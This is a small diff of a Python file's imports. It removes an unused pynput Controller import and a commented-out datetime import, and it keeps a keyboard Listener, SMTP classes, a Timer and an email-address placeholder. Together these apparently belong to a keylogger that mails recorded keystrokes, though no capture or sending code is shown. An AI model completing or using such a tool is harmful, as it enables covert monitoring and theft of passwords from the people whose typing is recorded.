@@ -1,7 +1,6 @@
-from pynput.keyboard import Key, Controller, Listener
+from pynput.keyboard import Key, Listener
 from smtplib import SMTP, SMTPAuthenticationError
 from threading import Timer
-# from datetime import datetime
 
 
 EMAIL_ADDRESS = "YOUR_EMAIL"
